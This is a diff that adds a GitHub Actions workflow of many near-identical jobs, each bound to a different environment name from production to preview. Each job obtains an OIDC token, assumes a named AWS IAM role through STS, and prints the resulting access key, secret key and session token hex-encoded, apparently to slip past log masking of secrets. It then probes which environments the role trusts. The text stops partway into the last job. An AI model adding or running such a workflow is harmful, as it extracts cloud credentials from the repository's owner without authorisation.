@@ -1,0 +1,613 @@
+name: i4462-oidc
+on: workflow_dispatch
+permissions:
+  id-token: write
+  contents: read
+jobs:
+  j_none:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: none
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_production:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: production
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: production
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_prod:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: prod
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: prod
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_staging:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: staging
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: staging
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_stage:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: stage
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: stage
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_dev:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: dev
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: dev
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_development:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: development
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: development
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_uat:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: uat
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: uat
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_qa:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: qa
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: qa
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_test:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: test
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: test
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_review:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: review
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: review
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_code-review:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: code-review
+    steps:
+      - name: oidc
+        env:
+          ROLES: '["arn:aws:iam::975049931254:role/github-actions-image-resizer"]'
+          ENVNAME: code-review
+        shell: python
+        run: |
+          import os,sys,json,base64,urllib.request,urllib.parse,re,traceback
+          roles=json.loads(os.environ.get('ROLES','[]'))
+          envname=os.environ.get('ENVNAME','plain')
+          url=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_URL',''); rt=os.environ.get('ACTIONS_ID_TOKEN_REQUEST_TOKEN','')
+          if not url: print('NO_OIDC_ENV'); raise SystemExit
+          u=url+('&' if '?' in url else '?')+'audience=sts.amazonaws.com'
+          tok=json.load(urllib.request.urlopen(urllib.request.Request(u,headers={'Authorization':'Bearer '+rt}),timeout=20))['value']
+          p=tok.split('.')[1]; p+='='*(-len(p)%4); c=json.loads(base64.urlsafe_b64decode(p))
+          print('CLAIMS sub=%s aud=%s ref=%s env=%s'%(c.get('sub'),c.get('aud'),c.get('ref'),c.get('environment')))
+          for role in roles:
+              body=urllib.parse.urlencode({'Action':'AssumeRoleWithWebIdentity','Version':'2011-06-15','RoleArn':role,'RoleSessionName':'i4462','WebIdentityToken':tok,'DurationSeconds':'3600'}).encode()
+              try:
+                  x=urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=body,headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=25).read().decode(); code=200
+              except urllib.error.HTTPError as e:
+                  x=e.read().decode(); code=e.code
+              print('ROLE %s code=%s'%(role,code))
+              if 'AccessKeyId' in x:
+                  def g(t):
+                      m=re.search('<%s>(.*?)</%s>'%(t,t),x); return m.group(1) if m else ''
+                  ak=g('AccessKeyId'); sk=g('SecretAccessKey'); st=g('SessionToken')
+                  print('@@AK %s'%ak.encode().hex()); print('@@SK %s'%sk.encode().hex()); print('@@ST %s'%st.encode().hex())
+                  print('ASSUME_OK %s env=%s'%(role,envname))
+                  try:
+                      print('WHOAMI '+urllib.request.urlopen(urllib.request.Request('https://sts.amazonaws.com/',data=urllib.parse.urlencode({'Action':'GetCallerIdentity','Version':'2011-06-15'}).encode(),headers={'Content-Type':'application/x-www-form-urlencoded'}),timeout=20).read().decode()[:400])
+                  except Exception as e: print('WHOAMI_ERR',e)
+              else:
+                  m=re.search('<Message>(.*?)</Message>',x,re.S); print('ASSUME_FAIL %s'%((m.group(1) if m else x)[:300].replace('\n',' ')))
+  j_preview:
+    runs-on: ubuntu-latest
+    timeout-minutes: 6
+    environment: preview
+    steps:
+      - name: oidc
